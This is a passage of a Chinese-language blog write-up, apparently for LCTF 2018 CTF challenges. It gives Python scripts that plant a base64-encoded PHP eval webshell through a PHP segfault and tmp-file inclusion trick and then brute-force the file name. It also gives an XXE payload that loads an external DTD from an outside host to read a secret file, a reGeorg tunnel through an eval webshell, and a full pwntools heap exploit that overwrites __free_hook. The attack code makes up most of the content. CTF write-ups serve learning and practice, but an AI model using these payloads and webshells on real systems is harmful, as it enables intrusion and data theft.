</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$mode = $_GET[&quot;m&quot;]; </span><br><span class="line"></span><br><span class="line">if ($mode == &quot;upload&quot;)&#123; </span><br><span class="line">     upload(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;show&quot;)&#123; </span><br><span class="line">    show(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;check&quot;)&#123; </span><br><span class="line">    check(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if($mode == &quot;move&quot;)&#123; </span><br><span class="line">    move($_GET[&apos;source&apos;],$_GET[&apos;dest&apos;]); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">     </span><br><span class="line">    highlight_file(__FILE__);     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">include(&quot;./comments.html&quot;);</span><br></pre></td></tr></table></figure>
+<p>差别:</p>
+<p><code>if(preg_match(&#39;/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i&#39;,$source_path)){</code>这一段正则里边多了<code>data</code>，所以无法读取<code>data</code>目录下的内容。</p>
+<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>可以导致 php 在执行过程中 Segment Fault,本地文件包含漏洞可以让 php 包含自身从而导致死循环<br>然后 php 就会崩溃 , 如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留。</p>
+<p><code>http://212.64.74.153/LCTF.php?m=check&amp;c=compress.zlib://php://filter/string.strip_tags/resource=/etc/passwd</code></p>
+<p>同时上传文件，文件就会保留在<code>tmp</code>中，然后爆破即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = &quot;192.168.43.155&quot;</span><br><span class="line">port = 80</span><br><span class="line">base_url = &quot;http://%s:%d&quot; % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload_file_to_include(url, file_content):</span><br><span class="line">    files = &#123;&apos;file&apos;: (&apos;evil.jpg&apos;, file_content, &apos;image/jpeg&apos;)&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_tmp_files():</span><br><span class="line">    webshell_content = &apos;&lt;?php eval($_REQUEST[c]);?&gt;&apos;.encode(</span><br><span class="line">        &quot;base64&quot;).strip().encode(&quot;base64&quot;).strip().encode(&quot;base64&quot;).strip()</span><br><span class="line">    file_content = &apos;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;flag&quot;;&#125;?&gt;&apos; % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = &quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot; % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = 6</span><br><span class="line">    times = len(charset) ** (length / 2)</span><br><span class="line">    for i in xrange(times):</span><br><span class="line">        print &quot;[+] %d / %d&quot; % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = &quot;192.168.43.155&quot;</span><br><span class="line">port = 80</span><br><span class="line">base_url = &quot;http://%s:%d&quot; % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_force_tmp_files():</span><br><span class="line">    for i in charset:</span><br><span class="line">        for j in charset:</span><br><span class="line">            for k in charset:</span><br><span class="line">                for l in charset:</span><br><span class="line">                    for m in charset:</span><br><span class="line">                        for n in charset:</span><br><span class="line">                            filename = i + j + k + l + m + n</span><br><span class="line">                            url = &quot;%s/include.php?f=/tmp/php%s&quot; % (</span><br><span class="line">                                base_url, filename)</span><br><span class="line">                            print url</span><br><span class="line">                            try:</span><br><span class="line">                                response = requests.get(url)</span><br><span class="line">                                if &apos;flag&apos; in response.content:</span><br><span class="line">                                    print &quot;[+] Include success!&quot;</span><br><span class="line">                                    return True</span><br><span class="line">                            except Exception as e:</span><br><span class="line">                                print e</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    brute_force_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">作者：王一航</span><br><span class="line">链接：https://www.jianshu.com/p/dfd049924258</span><br><span class="line">來源：简书</span><br><span class="line">简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</span><br></pre></td></tr></table></figure>
+<p>参考链接:</p>
+<p><a href="https://www.jianshu.com/p/dfd049924258" rel="external nofollow" target="_blank">https://www.jianshu.com/p/dfd049924258</a></p>
+<p>利用tmpfile getshell</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p>参考链接: <a href="https://www.anquanke.com/post/id/164818" rel="external nofollow" target="_blank">https://www.anquanke.com/post/id/164818</a></p>
+<p>8080端口是一个tomcat，上传评论的时候Content-Type改成xml存在xxe漏洞，有回显。但是POST数据中过滤了很多关键词，例如root、etc等，所以绕过方式为POST数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">&lt;!ENTITY % bbb SYSTEM &quot;http://ip:8000/ext.dtd&quot;&gt;%bbb;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;map&gt;</span><br><span class="line">&lt;name&gt;&amp;ddd;&lt;/name&gt;</span><br><span class="line">&lt;content&gt;asddsa&lt;/content&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+<p>ext.dtd中放敏感数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY ddd SYSTEM &quot;file:///var/www/read_secret&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="God-of-domain-pentest"><a href="#God-of-domain-pentest" class="headerlink" title="God of domain pentest"></a>God of domain pentest</h2><p>为复现: 仅仅练习reGeorg操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目描述：</span><br><span class="line">windows域环境权限不好配，还请各位师傅高抬贵手，不要搅屎 </span><br><span class="line">c段只用到了0-20，不需要扫21-255，端口也只开放了常用端口。 </span><br><span class="line">web.lctf.com中有个域用户是web.lctf.com\buguake,密码是172.21.0.8的本地管理员密码 </span><br><span class="line"></span><br><span class="line">188.131.161.90</span><br></pre></td></tr></table></figure>
+<p><img src="/assets/lctf/1758153588.png" alt=""></p>
+<p>端口转发工具：<a href="https://github.com/zsxsoft/reGeorg" rel="external nofollow" target="_blank">https://github.com/zsxsoft/reGeorg</a></p>
+<p>index.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$lshell=$_GET[&apos;lshell&apos;];</span><br><span class="line">eval($lshell);</span><br><span class="line">var_dump($lshell);</span><br></pre></td></tr></table></figure>
+<p>启动脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/lctf/reGeorg$ python reGeorgSocksProxy.py -p 8080 -u http://188.131.161.90/index.php -k lshell</span><br></pre></td></tr></table></figure>
+<p>设置代理:</p>
+<p><img src="/assets/lctf/TIM截图20181119223706.png" alt=""></p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>exp.py:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line">def add(size,data):</span><br><span class="line">    p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p=process(&apos;./easy_heap&apos;) #,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc64.so&apos;&#125;)</span><br><span class="line">#p=remote(&apos;118.25.150.134&apos;, 6666) </span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf0,&apos;aaa\n&apos;)</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">for i in range(3,8):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(9)</span><br><span class="line">dele(8)</span><br><span class="line">dele(2)</span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0xf0,&apos;aaa\n&apos;)</span><br><span class="line"># 这时候，unsorted bin中还有3个块，申请一个出来时，剩下的都会被添加到tcache中</span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x5595c02f3500 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 257, </span><br><span class="line">  fd = 0x5595c02f3b00, </span><br><span class="line">  bk = 0x5595c02f3300, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/4xg 0x5595c02f3b00</span><br><span class="line">0x5595c02f3b00:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x5595c02f3b10:	0x0000000000000000	0x00005595c02f3500</span><br><span class="line">pwndbg&gt; x/4xg 0x5595c02f3300</span><br><span class="line">0x5595c02f3300:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x5595c02f3310:	0x00005595c02f3500	0x00007fbc5c2bec78</span><br><span class="line"></span><br><span class="line">这样就可以绕过检查: p-&gt;bk-&gt;fd == p &amp;&amp; p-&gt;fd-&gt;bk == p</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># 这里需要注意，不能添加任何值，否则会破坏里边的指针</span><br><span class="line">add(0xf8, &apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">dele(4)</span><br><span class="line">dele(6)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x5595c02f3600 &#123;</span><br><span class="line">  mchunk_prev_size = 256, </span><br><span class="line">  mchunk_size = 256, </span><br><span class="line">  fd = 0x559500616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">dele(5)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&quot;index \n&gt; &quot;)</span><br><span class="line">p.sendline(&apos;8&apos;)</span><br><span class="line"></span><br><span class="line">addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;addr&quot;, hex(addr)</span><br><span class="line">libc_base = addr - (0x7f3c863a4c78 - 0x7f3c85fca000)</span><br><span class="line">print &quot;libc_base&quot;, hex(libc_base)</span><br><span class="line">free_hook = libc_base+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(16,&apos;/bin/bash\n&apos;)</span><br><span class="line">one = libc_base + 0xfccde</span><br><span class="line">print &quot;free_hook&quot;, hex(free_hook)</span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">dele(5)</span><br><span class="line">dele(8)</span><br><span class="line">dele(9)</span><br><span class="line">add(16,p64(free_hook)+&apos;\n&apos;)</span><br><span class="line">add(16,&apos;abc\n&apos;)</span><br><span class="line">add(16,p64(one)+&apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/3376/">https://www.tiandiwuji.top/posts/3376/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/3376/">November 19th 2018, 7:52:27 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/16617/" title="code-breaking">
+                    <div class="nextTitle">code-breaking</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/62306/" title="babystack-ret2dlsolve">
+                    <div class="prevTitle">babystack-ret2dlsolve</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Travel"><span class="toc-number">1.1.</span> <span class="toc-text">Travel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码"><span class="toc-number">1.1.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-getnode"><span class="toc-number">1.1.2.</span> <span class="toc-text">uuid.getnode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传文件"><span class="toc-number">1.1.3.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写公钥"><span class="toc-number">1.1.4.</span> <span class="toc-text">写公钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T4lk-is-cheap-show-me-the-shell"><span class="toc-number">1.2.</span> <span class="toc-text">T4lk is cheap,show me the shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传文件-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">上传文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-oauth"><span class="toc-number">1.3.</span> <span class="toc-text">EZ oauth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简述"><span class="toc-number">1.3.1.</span> <span class="toc-text">简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注册登录"><span class="toc-number">1.3.2.</span> <span class="toc-text">注册登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bestphp’s-revenge"><span class="toc-number">1.4.</span> <span class="toc-text">bestphp’s revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用soap触发ssrf"><span class="toc-number">1.4.1.</span> <span class="toc-text">利用soap触发ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置user-agent头来构造CRLF"><span class="toc-number">1.4.2.</span> <span class="toc-text">设置user_agent头来构造CRLF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-php"><span class="toc-number">1.4.3.</span> <span class="toc-text">payload.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将payload写入某个session5rtososkghp97ud5fgupgpk014"><span class="toc-number">1.4.4.</span> <span class="toc-text">将payload写入某个session5rtososkghp97ud5fgupgpk014</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-serialize引擎反序列化"><span class="toc-number">1.4.5.</span> <span class="toc-text">php_serialize引擎反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过SoapClient调用不存在的方法，触发反序列化"><span class="toc-number">1.4.6.</span> <span class="toc-text">通过SoapClient调用不存在的方法，触发反序列化.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getFlag"><span class="toc-number">1.4.7.</span> <span class="toc-text">getFlag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#L-playground2"><span class="toc-number">1.5.</span> <span class="toc-text">L playground2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#os-path-join特性："><span class="toc-number">1.5.1.</span> <span class="toc-text">os.path.join特性：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下载文件"><span class="toc-number">1.5.2.</span> <span class="toc-text">下载文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sh0w-m3-the-sh31l-4ga1n"><span class="toc-number">1.6.</span> <span class="toc-text">sh0w m3 the sh31l 4ga1n</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法1"><span class="toc-number">1.6.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法二"><span class="toc-number">1.6.2.</span> <span class="toc-text">方法二:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#God-of-domain-pentest"><span class="toc-number">1.7.</span> <span class="toc-text">God of domain pentest</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-heap"><span class="toc-number">2.1.</span> <span class="toc-text">easy_heap</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
